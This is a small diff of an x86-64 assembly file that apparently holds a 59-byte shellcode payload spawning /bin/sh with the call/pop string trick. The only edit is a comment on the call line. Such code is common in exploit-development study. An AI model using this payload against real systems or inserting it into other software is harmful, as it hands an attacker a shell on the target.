@@ -22,5 +22,5 @@ main:
   xorq    %rdi, %rdi          #3B, set destination index (1st syscall param) to 0
   syscall                     #2B, exit(0)
 
-  call    . - 0x24            #5B, main() -> push %rip (.string address), jump 36B backwards (line9) 
+  call    . - 0x24            #5B, push %rip (.string address), jump 36B backwards (line9) 
   .string	"/bin/sh000000000"  #16B, total shellcode size = 59B
